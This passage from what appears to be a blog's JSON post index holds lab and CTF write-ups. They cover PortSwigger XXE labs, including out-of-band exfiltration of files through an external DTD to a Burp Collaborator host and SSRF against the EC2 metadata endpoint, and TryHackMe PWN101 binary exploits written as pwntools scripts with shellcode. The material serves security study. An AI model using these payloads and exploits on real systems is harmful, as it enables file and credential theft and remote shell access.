&quot;D̳͔e̝ͩ̐ͅsc̗̱̼̤̬̎̓ͪͣͭ̐ͅr̪̝͖̙̱̄̓͌̓̚ip̭̦̭̰̻ͣ̓̽ͨ̚ț̤̝̻i̹̱̟̞͕̓̓ͬ̓ͬ̆ͅon̠͚͕̈́̋̓:&quot; } }, &quot;fn&quot;: { &quot;name&quot;: &quot;Suomalainen&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;Palaa luetteloon&quot;, &quot;View details&quot;: &quot;Näytä kuvaus&quot;, &quot;Description:&quot;: &quot;Kuvaus:&quot; } }, &quot;hw&quot;: { &quot;name&quot;: &quot;Ōlelo Hawaiʻi&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;Hoʻi i ka papa inoa&quot;, &quot;View details&quot;: &quot;E nānā i nā kikoʻī&quot;, &quot;Description:&quot;: &quot;ʻO keʻano:&quot; } }, &quot;mm&quot;: { &quot;name&quot;: &quot;ဗမာ&quot;, &quot;translations&quot;: { &quot;Return to list&quot;: &quot;စာရင်းသို့ပြန်သွားသည်&quot;, &quot;View details&quot;: &quot;အသေးစိတ်ကြည့်ရန်&quot;, &quot;Description:&quot;: &quot;ဖော်ပြချက်:&quot; } }}Do not forget to add Access-Control-Allow-Origin: * into the header.With the payload above, if we poison /, we’ll trigger the payload but ONLY if we chose ES language!Now we should be able to trigger an Alert.To trigger an alert at victim’s, We’d need to poison cache on another spot. If we set x-original-url: /setlang\\esThe /setlang\\es part was the one that needed some fiddling around.If we twist the slash, webserver will autocorrect. We can confirm that 302 requests are cache-ble and autocorrection is doing us a favour.If we’ve done everything right and poisoned the cache which will lure all users to spanish page, we should have solced the lab." }, { "title": "(Portswigger/WebAcademy) - XXE Injection", "url": "/posts/XXE_Injection/", "categories": "Web Application, XXE Injection", "tags": "Notes, Web Application, Portswigger", "date": "2022-10-27 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the XXE Injection.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.What can we do with XXE-based vulnerabilites: retrieve files, where an external entity is defined containing the contents of a file, and returned in the application’s response. perform SSRF attacks, where an external entity is defined based on a URL to a back-end system. exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls. retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.TOC Intro TOC Exploiting XXE using external entities to retrieve files Exploiting XXE to perform SSRF attacks Exploiting XInclude to retrieve files Exploiting XXE via image file upload Blind XXE with out-of-band interaction via XML parameter entities Blind XXE with out-of-band interaction Exploiting blind XXE to exfiltrate data using a malicious external DTD Exploiting blind XXE to retrieve data via error messagesExploiting XXE using external entities to retrieve files This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.Checking the instructions, we’re supposed to check the Check stock feature, so let’s do that and have Burp running in the background.That’s the payload that will be used:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;&amp;lt;storeId&amp;gt;&amp;amp;xxe;&amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt;And we’we got the contents of /etc/passwd back!Exploiting XXE to perform SSRF attacks This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server’s IAM secret access key from the EC2 metadata endpoint.We have to try to achieve SSRF, so let’s start with checking the Check stock feature:Let’s try to exploit SSRF using XXE VulnerabilityWe can see that we get latest return which is folder. We can get to admin-key in few iterations:As soon as we reach the secret access key, lab will get solved.Exploiting XInclude to retrieve files This lab has a “Check stock” feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don’t control the entire XML document you can’t define a DTD to launch a classic XXE attack. To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.We know that Check stock is vulnerable, so let’s use it and check the request in Burp.We will inject the payload inthe the productId value:&amp;lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&amp;gt;&amp;lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&amp;gt;&amp;lt;/foo&amp;gt;Lab has been solved!Exploiting XXE via image file upload This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the “Submit solution” button to submit the value of the server hostname.In this lab we have to upload malicious SVG as avatar. We have to create SVG File beforehand:&amp;lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&amp;gt;&amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &amp;gt; ]&amp;gt;&amp;lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&amp;gt;&amp;lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&amp;gt;&amp;amp;xxe;&amp;lt;/text&amp;gt;&amp;lt;/svg&amp;gt;Save that as SVG and upload as avatar:When checking the avatar on the post, image with file contents should appear.Submit hostname as solution in order to solve the lab.Blind XXE with out-of-band interaction via XML parameter entities This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.This lab is all about blind XXE so we won’t get any direct response to our payloads.Callback:Lab has been solved.Blind XXE with out-of-band interaction This lab has a “Check stock” feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.To solve this lab, we have to put the DOCTYPE after the xml declaration or else the payload will not work!.Exploiting blind XXE to exfiltrate data using a malicious external DTD This lab has a “Check stock” feature that parses XML input but does not display the result.To solve the lab, exfiltrate the contents of the /etc/hostname file.For this lab, the same vulnerability exist in the “Check stock” functionality.If we try to put entities, we will get an error.When sending an XML like this, we’ll get a callback.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE stockCheck [ &amp;lt;!ENTITY % xxe SYSTEM &quot;http://fyhkrxyhswt25ohovyzz9ovojfp6d11q.oastify.com/test.dtd&quot;&amp;gt; %xxe;]&amp;gt;&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;&amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt;Now we need to put test.dtd on our exploit server.&amp;lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&amp;gt;&amp;lt;!ENTITY % eval &quot;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &#39;https://g5mlyy5izx03cpop2z60gp2pqgw7k38s.oastify.com/?x=%file;&#39;&amp;gt;&quot;&amp;gt;%eval;%exfil;If everything has been done right, callback with an hostname should pop in the collaborator.Exploiting blind XXE to retrieve data via error messages This lab has a “Check stock” feature that parses XML input but does not display the result. To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.Same as previous lab, we first can check if we get a callback, which by using following query IS the case.We’ll use following payload on the remote server serving malicious dtd file, in order to print the contents of a local file /etc/passwd:&amp;lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;&amp;lt;!ENTITY % eval &quot;&amp;lt;!ENTITY &amp;amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&amp;gt;&quot;&amp;gt;%eval;%error;" }, { "title": "(TryHackMe) - PWN101", "url": "/posts/THM_binexp_pwn101/", "categories": "Binary Exploitation, CTF", "tags": "Notes, Binary Exploitation, CTF", "date": "2022-10-26 09:00:00 +0200", "snippet": "This is all about Binary Exploitation. As i haven’t done that in a while i thought it would be nice to go back to TryHackMe and do some challenges there. I can only recommend the PWN101 as it’s about the right level for a refresher but it expects some knowledge to already be there so beware. Choose another room if you feel lost!TOC TOC PWN101.pwn101 - Stack BOF - Straight to System Shell File Checksec Disssasembly Exploit (local) Exploit (remote) PWN102 - Stack BOF - Simple Execution Flow Change File Checksec Dissasembly in cutter Exploit (local) Exploit (Remote) PWN103 - Hijack Execution Flow (BOF) - Ret2Win File Checksec Analysis Main General Admins_only Exploit (local) Exploit (remote) PWN104 - Stack BOF - Ret2Shellcode Checksec and File check Analysis Exploit (local) Exploit (remote) PWN105 - Integer Overflow/Underflow File and Checksec Analysis Exploit PWN106 - Format String Vulnerability - Reading the Stack File Checksec Dissasembly Exploit local Exploit Remote PWN107 - Format String Vulnerability - PIE and Canary Bypass File Checksec Analysis Exploit - 1st Part =&amp;gt; Format String Vulnerability Leak Exploit - 2nd Part = Buffer Overflow PWN108 - Format String Vulnerability - GOT Overwrite File Checksec Finding the vulnerability (Decompiler) Exploitation PWN109 - Stack BOF - Ret2Libc File and Checksec Analysis Cutter Dissasembly Leaking the addresses from stack PWN110 - todo RADARE2 CheatSheet Random Scripts Leak addresses - format string vuln PWN101.pwn101 - Stack BOF - Straight to System Shell This should give you a start: ‘AAAAAAAAAAA’ Challenge is running on port 9001When we start the binary we see following text:Binary asks for input and prints something after we press enter.If we enter longer string, we get dropped to a shellFileluka@yurei:~/Desktop/thm$ file pwn101.pwn101 pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not strippedBinary is dynamically linked and it’s not strippedChecksecDisssasemblyWe have function gets which can get overflown buffer. Input comes from the variable var char +s @ rbp-0x40. With 40 bytes/characters we fill the buffer.Right below we have compare function (an if statement):(dissasembly view below!)To solve the lab, we just need to overwrite the var_4h or the 0x539 value which resides at rbp-0x4.As our stack starts growing at rbp-0x40 we need to add somewhere beetween (0x40-0x4) and additional 1-3 Bytes to overwrite the var_4h.Exploit (local)from pwn import *context.binary = binary = &#39;./pwn101.pwn101&#39;padding_needed = 0x40-0x4padding = &quot;\\x41&quot;*padding_neededjunk = &quot;\\x42&quot;payload = padding + junkproc = process(&#39;./pwn101.pwn101&#39;)proc.recvline(&#39;Type the required ingredients to make briyani:&#39;)proc.sendline(payload)proc.interactive()Exploit (remote)from pwn import *context.binary = binary = &#39;./pwn102.pwn102&#39;padding_range = 0x70-0x08padding = &quot;\\x41&quot;*padding_range# code = 0x0000c0d3 =&amp;gt; \\xd3\\xc0\\x00\\x00# coffee = 0x00c0ff33 =&amp;gt; \\x33\\xff\\xc0\\x00code = &quot;\\xd3\\xc0\\x00\\x00&quot;coffee = &quot;\\x33\\xff\\xc0\\x00&quot;payload = padding + code + coffeeproc = process(&#39;./pwn102.pwn102&#39;)proc.recvline(&#39;Am I right?&#39;)proc.send(payload)proc.recv()proc.interactive()Binary has been pwnedPWN102 - Stack BOF - Simple Execution Flow Change The challenge is running on port 9002Let’s download the binary and check it locally.It’s again a simple authentication that expect text input from usIt’s not that simple to crash it as the binary in the PWN101 so we’re going to have a deeper look.FileBinary is dynamically linked and not stripped!ChecksecDissasembly in cutterLet’s load the binary into cutter and check the main function and start from there.We have 3 variables, 2 functions which are: setup bannerAnd there comes printf which might be interesting if any format string vulnerabilities are present. I’ll switch to Decompiler to have a better look.As it can be seen above, the printf is just printing strings.Our input get’s however loaded to scanffunction, and there comes If statement into play.First of all, scanf is vulnerable. I’ve loaded the breakpoint address from the if statement into GDB b *main+148 and did notice that some pointers and stack was overflown.Now onto the exploit.Remember the variables: var_4h = 0xbadf00d var_8h = 0xfee1deadTwo subsequent IF statements want coffee and code: var_4h == 0x00c0ff33 var_8h == 0x0000c0d3If we calculate their positions, we can change the variables so we get that system call. We have c0f3 at ebp 0x70-0x8 and c0ff33 right afterwards (0x70-0x04).Exploit (local)from pwn import *context.binary = binary = &#39;./pwn102.pwn102&#39;padding_range = 0x70-0x08padding = &quot;\\x41&quot;*padding_range# code = 0x0000c0d3 =&amp;gt; \\xd3\\xc0\\x00\\x00# coffee = 0x00c0ff33 =&amp;gt; \\x33\\xff\\xc0\\x00code = &quot;\\xd3\\xc0\\x00\\x00&quot;coffee = &quot;\\x33\\xff\\xc0\\x00&quot;payload = padding + code + coffeeproc = process(&#39;./pwn102.pwn102&#39;)proc.recvline(&#39;Am I right?&#39;)proc.send(payload)proc.recv()proc.interactive()Exploit (Remote)from pwn import *context.binary = binary = &#39;./pwn102.pwn102&#39;padding_range = 0x70-0x08padding = &quot;\\x41&quot;*padding_range# code = 0x0000c0d3 =&amp;gt; \\xd3\\xc0\\x00\\x00# coffee = 0x00c0ff33 =&amp;gt; \\x33\\xff\\xc0\\x00code = &quot;\\xd3\\xc0\\x00\\x00&quot;coffee = &quot;\\x33\\xff\\xc0\\x00&quot;payload = padding + code + coffee#proc = process(&#39;./pwn102.pwn102&#39;)proc = remote(&#39;10.10.227.21&#39;,9002)proc.recvline(&#39;Am I right?&#39;)proc.send(payload)proc.recv()proc.interactive()PWN103 - Hijack Execution Flow (BOF) - Ret2Win The challenge is running on port 9003Simply by running the binary, we get a menu. While choosing 3) General we get Segmentation faultFileluka@yurei:~/Desktop/thm/pwn103$ file pwn103.pwn103 pwn103.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not strippedChecksecAnalysisLet’s check decompiler first, for the sake of readibility, as the codebase is pretty big.MainWe can see that we have switch. Spoler alert, the one with vulnerability is the General()!GeneralWe have scanf function that takes our input…… and is declared as string format specifier. We can enter as much characters/bytes as we want.Note that in the end of the General function there is a compare, and if we check the address in hexdump, we’d find the string yesIn addition to all of that, there is Admins_only function which is the one we want to solve this CTFAdmins_onlyThis is decompiled codeHow can we get into the Admins_only function? We can abuse scanf function in general. We can write to *s1 variable, which resides at rbp-0x20 . From there we can overwrite the return address of general function that was put onto the stack and make it return to Admins_only function instead.In order to reach the return address, we need 8 more bytes (64-bit!) so 28 in total.Because of MOVAPS issue we can add another RET instruction before actual payload call.Exploit (local)from pwn import *context.binary = binary = ELF(&quot;./pwn103.pwn103&quot;)#p = process()p = remote(&quot;10.10.16.17&quot;,9003)p.sendline(b&quot;3&quot;)#admins_only_address = p64(0x00401554)# alternative calladmins_only_address = p64(binary.symbols.admins_only)ret_instruction = p64(0x00401377)# payload before MOVAPS - adding ret_instruction#payload = b&quot;A&quot;*0x20 + b&quot;B&quot;*0x8 + admins_only_address# payload after fixing the bugpayload = b&quot;A&quot;*0x20 + b&quot;B&quot;*0x8 + ret_instruction + admins_only_addressp.sendline(payload)p.interactive()Exploit (remote)from pwn import *context.binary = binary = ELF(&quot;./pwn103.pwn103&quot;)#p = process()p = remote(&quot;10.10.16.17&quot;,9003)p.sendline(b&quot;3&quot;)#admins_only_address = p64(0x00401554)# alternative calladmins_only_address = p64(binary.symbols.admins_only)ret_instruction = p64(0x00401377)# payload before MOVAPS - adding ret_instruction#payload = b&quot;A&quot;*0x20 + b&quot;B&quot;*0x8 + admins_only_address# payload after fixing the bugpayload = b&quot;A&quot;*0x20 + b&quot;B&quot;*0x8 + ret_instruction + admins_only_addressp.sendline(payload)p.interactive()PWN104 - Stack BOF - Ret2Shellcode The challenge is running on port 9004After downloading the binary let’s check what that appliation does?Looks like another buffer overflow. When running binary few times, we can notice that that address that is provided to as in ... i&#39;m waiting for you at... changes with every executionWe have to deal with ASLR here.Another way to check this would be to check the address of Dynamic Linkerldd pwn104.pwn104Checksec and File checkAnalysisBuffer overflow is in the Read functionSo, we know what we will overwrite - Buffer (*buf) starts at rbp-0x50, but we musst know it’s address if we want to return to it.Remember that binary is printing some addresses, but what is it printing exactly? =&amp;gt; it’s the pointer to the buf ( see the printf function above)Another thing to point out here is what gives us permission to execute custom shellcode from the stack? ==&amp;gt; NX is disabled!This code was used to test the poinrer to the *buf position using the leak that is there to help us ;)from pwn import *context.binary = binary = ELF(&#39;./pwn104.pwn104&#39;)p = process()addr_leak = p.recv()addr_main = addr_leak.split(b&quot;at&quot;)[1].decode(&quot;utf-8&quot;)print(addr_main)# This prints the address in HEX formatShellcode: https://www.exploit-db.com/exploits/42179Exploit (local)Notice how the leaked pointer address was splitted and converted to hexadecimal!from pwn import *context.binary = binary = ELF(&#39;./pwn104.pwn104&#39;)context.log_level = &quot;debug&quot;# Size 23B - source: https://www.exploit-db.com/exploits/46907shellcode=b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&quot;p = process()addr_leak = p.recv()addr_buf_pointer = int(addr_leak.split(b&quot;at&quot;)[1].strip().decode(&quot;utf-8&quot;),16)#print(addr_buf_pointer)payload = shellcode + b&quot;A&quot;*(0x50 - len(shellcode)) + b&quot;B&quot;*0x8 + p64(addr_buf_pointer)p.sendline(payload)p.interactive()Exploit (remote)from pwn import *context.binary = binary = ELF(&#39;./pwn104.pwn104&#39;)#context.log_level = &quot;debug&quot;# Size 23B - source: https://www.exploit-db.com/exploits/46907shellcode=b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&quot;p = process()p = remote(&quot;10.10.109.228&quot;,9004)p.recv()addr_leak = p.recv()addr_buf_pointer = int(addr_leak.split(b&quot;at&quot;)[1].strip().decode(&quot;utf-8&quot;),16)#print(addr_buf_pointer)payload = shellcode + b&quot;A&quot;*(0x50 - len(shellcode)) + b&quot;B&quot;*0x8 + p64(addr_buf_pointer)p.sendline(payload)p.interactive()Same code was used for remotely, execpt there was another p.recv() needed which had to be debugged using context.log_level = &quot;debug&quot;PWN105 - Integer Overflow/Underflow The challenge is running on port 9005File and ChecksecAnalysisThere are no special functions of interest, so let us sheck the main function.There are 2 scanf which are the ones that load our input to memory.If we check the 0x000216f in hexdump we can see that both point to with %d format specifier. %d stands stands for signed integer (negative AND positive). 0x00012fb both values are added and are saved on 0x000012fd into var_ch. 0x00001303 compares if both signs are positiveIf we check the rest of the execution flows, we can locate system call which is where we want to get to. 0x0000130a - var_10h is checked again if signed = if positive Regarding CMP operand at 0x0000130e: Compares the first source operand with the second source operand and sets the status flags in the EFLAGS register according to the results. The comparison is performed by subtracting the second operand from the first operand and then setting the status flags in the same manner as the SUB instruction. When an immediate value is used as an operand, it is sign-extended to the length of the first operand. …The CF, OF, SF, ZF, AF, and PF flags are set according to the result REFERENCE 0x00001312 checks if signed (sf=1) =&amp;gt; the result this is the point where we need negative result to get to the branch with system functionWe are aiming at Integer overflow/underflow. I’ve personally had to deal with the same concept here: http://cybersec-research.space/posts/Bussines-Logic-Vulnerabilities/#low-level-logic-flaw—integer-overflowIf we overflow the left-most bit of the signed integer, we will endup with a negative value.ExploitTo solve the lab we musst add (&amp;gt;=1) to the highest possible positive number of signed integer in 32-bit space =&amp;gt; 2147483647This will work on remote machine as well.PWN106 - Format String Vulnerability - Reading the Stack The challenge is running on port 9006Download the lab and run it to check what we’re dealing with.We have print format vulnerability as we’re leaking memory as seen above.File64-bit, dynamically linked and not strippedChecksecDissasemblyWe can see flags placeholder on the stack, so we’ll try to leak memory here.Calling convention in x64 bit stack =&amp;gt; RDI, RSI, RDX, RCX, R8, R9 and then Stack!Exploit localLink to calling convetion ==&amp;gt;Let’s try to leak some data.from pwn import *context.binary = binary = &#39;./pwn106user.pwn106-user&#39;#payload = &quot;%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX&quot;payload = &quot;%6$lX.%7$lX.%8$lX.%9$lX.%a$lX&quot;conn = process(&#39;./pwn106user.pwn106-user&#39;)conn.recv()conn.sendline(payload)result= conn.recvall()print(result)Relevant data starts at 6th position until 10th. Bytes needs to be compared to actually match the ascii representations.from pwn import *context.binary = binary = &#39;./pwn106user.pwn106-user&#39;conn = remote(&#39;10.10.93.168&#39;,9006)#payload = &quot;%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX&quot;payload = &quot;%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX&quot;conn.recv()conn.sendline(payload)result= conn.recvall()print(result)Using script we get the flag. Decoding was done using Cyberchef.Exploit RemoteScripts comes here!Putting output to the cyberchef shows the flag.PWN107 - Format String Vulnerability - PIE and Canary BypassDownload the lab and check what is all aboutTyping simple %x leaks a memory address.FileChecksecAnalysisThe second variable *buf takes in 0x200 where only 0x20 were allocated to.There is also a function that isn’t called from the execution flow perspective and this is the get_streak function which also has system function in it which calls shell.Canary resides at rbp-0x8 so in order to overwrite it we would need to know it’s value beforehand. Do we have Format String vulnerability before the Read function? Yes we do!To leak the addresses now, we need to start debugging. I’ll use radare2 debugger as razvi uses in his video https://www.youtube.com/watch?v=FpKL2cAlJbMStart the binary: radare2 -d -A pwn107.pwn107I’ll leave a cheat-sheet below because i also tend to forget the commands used for each debugger!This is now main function loaded in radare2. Use pdf @ main to print it.Now let’s set the breakpoints where our printf vulnerability call starts and after it.[0x7fa225a1e2b0]&amp;gt; db 0x557397c00a25[0x7fa225a1e2b0]&amp;gt; db 0x557397c00a2aStart with execution using dcAs we’ve hit the breakpoint let’s read the stack using pxr @ rsp. Below i’ve raked the RSP and RBP pointers.Stack direction is displayed upside down!We can now see where canary and other variables are at, at this point of execution. Canary is at RBP-0x8. If we chose to overwrite it, we would also need to return back to the function (main).We can’t use the return adress of main because this points to libc_so.6 so we need to return somewhere in the main function! We can use dm memory map to see to which process one address belongs.We should take one that belongs to pwn107.pwn107 and also stays on the on the stack after we write onto stack through read functonExploit - 1st Part =&amp;gt; Format String Vulnerability LeakNow to leak simple addresses we run into how-much-space-do-we-have problem. It’s 20Bytes.We leak the addresses from 6th position - Notice the 0x44434241!If we now want to leak 7th and 11th position from top of the RSP (7th = canary, 11th = function to return to) we just need to add 6th. Let’s test this in debugger! We will leak 13th and 17th position respectively!Now after running following script, the leaks seem right&#39;&#39;&#39;Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.It was calculated that canary leaks at 13th position and the function to return to at 17th.&#39;&#39;&#39;from pwn import *context.binary = binary = ELF(&quot;./pwn107.pwn107&quot;,checksec=False)# This serves just to get the offset from the start of the binarystatic_libc_csu_address = binary.symbols.__libc_csu_initprint(&quot;Address of static libc csu init: {}&quot;.format(hex(static_libc_csu_address)))p = process()p.recvuntil(b&quot;streak?&quot;)payload = b&quot;%13$lX.%17$lX&quot;p.sendline(payload)p.recvuntil(b&quot;streak:&quot;)output = p.recv().split(b&quot;\\n&quot;)[0]print(output)To fix the formatting of the leaked addresses, script was modified.&#39;&#39;&#39;Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.IT was calculated that canary leaks at 9th position and the function to return to at 17th.&#39;&#39;&#39;from pwn import *context.binary = binary = ELF(&quot;./pwn107.pwn107&quot;,checksec=False)# This serves just to get the offset from the start of the binarystatic_libc_csu_address = binary.symbols.__libc_csu_initstatic_main_address = binary.symbols.mainprint(&quot;Address of static libc csu init: {}&quot;.format(hex(static_libc_csu_address)))print(&quot;Address of static main function: {}&quot;.format(hex(static_main_address)))p = process()p.recvuntil(b&quot;streak?&quot;)payload = b&quot;%13$lX.%17$lX&quot;p.sendline(payload)#print(&quot;Payload to leak Canary and Func: {}&quot;.format(hex(payload)))p.recvuntil(b&quot;streak:&quot;)output = p.recv().split(b&quot;\\n&quot;)[0]print(&quot;Leaked Addresses (unformated): {}&quot;.format(output))dynamic_main_address = int(output.split(b&quot;.&quot;)[1].strip(), 16)canary_address = int(output.split(b&quot;.&quot;)[0].strip(), 16)print(&quot;Dynamic Libc: {}&quot;.format(hex(dynamic_main_address)))print(&quot;Canary: {}&quot;.format(hex(canary_address)))# Output#Leaked Addresses (unformated): b&#39; 6C70AC6BD4259200.565120E00992&#39;#Dynamic Libc: 0x565120e00992#Canary: 0x6c70ac6bd4259200&#39;&#39;&#39;In order to get the base address of the binary, we muss subtract static from dynamic address!&#39;&#39;&#39;dynamic_base_address = dynamic_main_address - static_main_addressbinary.address = dynamic_base_addressprint(&quot;New binary address starts now at: {}&quot;.format(hex(dynamic_base_address)))# From this point on it&#39;s all about buffer overflow Important takeaway here is: IF we substract static base address from dynamic address that was leaked, we get a base address of the binary. I recommend following post which explains the offsets very well: https://www.politoinc.com/post/return-to-libc-linux-exploit-developmentExploit - 2nd Part = Buffer OverflowRegarding Buffer oveflow this is the part where it happens:; var const char *format @ rbp-0x40; var void *buf @ rbp-0x20; var int64_t canary @ rbp-0x8To recap, input will be put into *buf at rbp-0x20 and up to 200 bytes can be written. At rbp-0x8 we reach the canary, which we will need to rewrite.To calculate the bytes we can use calculator which gives us 0x180x20 - 0x8 = 0x18Or do it with python script directly.&#39;&#39;&#39;Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.IT was calculated that canary leaks at 9th position and the function to return to at 17th.&#39;&#39;&#39;from pwn import *context.binary = binary = ELF(&quot;./pwn107.pwn107&quot;,checksec=False)# This serves just to get the offset from the start of the binarystatic_main_address = binary.symbols.mainprint(&quot;Address of static libc csu init: {}&quot;.format(hex(static_libc_csu_address)))print(&quot;Address of static main function: {}&quot;.format(hex(static_main_address)))p = process()p.recvuntil(b&quot;streak?&quot;)payload = b&quot;%13$lX.%17$lX&quot;p.sendline(payload)#print(&quot;Payload to leak Canary and Func: {}&quot;.format(hex(payload)))p.recvuntil(b&quot;streak: &quot;)output = p.recv().split(b&quot;\\n&quot;)[0]print(&quot;Leaked Addresses (unformated): {}&quot;.format(output))dynamic_main_address = int(output.split(b&quot;.&quot;)[1].strip(), 16)canary_address = int(output.split(b&quot;.&quot;)[0].strip(), 16)print(&quot;Dynamic Libc: {}&quot;.format(hex(dynamic_main_address)))print(&quot;Canary: {}&quot;.format(hex(canary_address)))# Output#Leaked Addresses (unformated): b&#39; 6C70AC6BD4259200.565120E00992&#39;#Dynamic main: 0x6c70ac6bd4259200#Canary: 0x565120e00992&#39;&#39;&#39;In order to get the base address of the binary, we muss subtract static from dynamic address!&#39;&#39;&#39;dynamic_base_address = dynamic_main_address - static_main_addressbinary.address = dynamic_base_addressprint(&quot;New binary address starts now at: {}&quot;.format(hex(dynamic_base_address)))# From this point on it&#39;s all about buffer overflow # Remember, we want to get into the get_streak function!dynamic_get_streak = binary.symbols.get_streak## Implant the RET Gadget since running it on Ubunturop=ROP(binary)ret_gadget= rop.find_gadget([&#39;ret&#39;])[0]payload = b&quot;A&quot;*0x18 + p64(canary_address) + b&quot;B&quot;*8 + p64(ret_gadget) + p64(dynamic_get_streak)p.sendline(payload)p.interactive()PWN108 - Format String Vulnerability - GOT OverwriteDownload the file and run it to see what we’re up against (in case we can notice something!)We are asked for 2 inputes (name, register no.). Name seems normal at the first glanze where Register No. leaks memory.FileChecksecFinding the vulnerability (Decompiler)So we’ve found the canary and where the vulnerability exists. At the end of the main function, there’s a IF statementOne returns to some address and another one is a fail. This is canary check, but there is another function Holidays() which has system function in it. This is where we want to return!Regarding GOT overwrite itself. We will rewrite puts function as it does not appear in the holidays() function as printf does!ExploitationFirst we must find the position where our input get’s injected onto the stack.Let’s write the Puts GOT address into the 10th position using format string vulnerabilityfrom pwn import *context.binary = binary = ELF(&quot;./pwn108.pwn108&quot;, checksec=False)# PWNTools will get the offset from the binary!got_puts_address = binary.got.putsprint(&quot;GOT puts address has an offset of {}&quot;.format(hex(got_puts_address)))junk_payload = b&quot;A&quot;*0x12After Explanation from Razvi ==&amp;gt; https://www.youtube.com/watch?v=9SWYvhY5dYw&amp;amp;t=845s we can calculate the number of bytes to write by subtracting written bytes so far with desired value!.Format specifier %x prints integers as hexadecimal!payload = p64(got_puts_address) + b&quot;%10$n&quot;Since put Address has 0x00 in it, we have to turn the payload around.payload = b&quot;%40X%12$nAAAAAAA&quot; + p64(got_puts_address)We need AAAAAAA in order to fill the bytes and with that our got_puts_address comes at the 12th positionfrom pwn import *context.binary = binary = ELF(&quot;./pwn108.pwn108&quot;, checksec=False)# PWNTools will get the offset from the binary!got_puts_address = binary.got.putsprint(&quot;GOT puts address has an offset of {}&quot;.format(hex(got_puts_address)))#fill the read buffer. If my understanding is correct, we could also use readuntil from pwn tools and give an input here, but result should be the same.junk_payload = b&quot;A&quot;*0x12#payload = p64(got_puts_address) + b&quot;%10$n&quot;#Turn the address around to avoid stopping reading because of null bytespayload = b&quot;%40X%12$nAAAAAAA&quot; + p64(got_puts_address)with open(&quot;payload&quot;, &quot;wb&quot;) as f: f.write(junk_payload) f.write(payload)The script above will write a payload to a file, which can be ingested to Radare2Payload can be read in radare like thisradare2 -R stdin=payload -d -A pwn108.pwn108Set breakpoints where vulnerable printf function resides and on the instruction after using db 0x12312312 command.We’ve hit the breakpoint. We can check if the location from puts has been filled using pxr @ section..got.pltIf we continue the execution and check the puts value again in the got.plt we have the value that we’ve overwritten with, but only the first 4 bytes. This is because %n format specifier only writes 4 bytes by default.To overwrite the full value, we just have to conduct 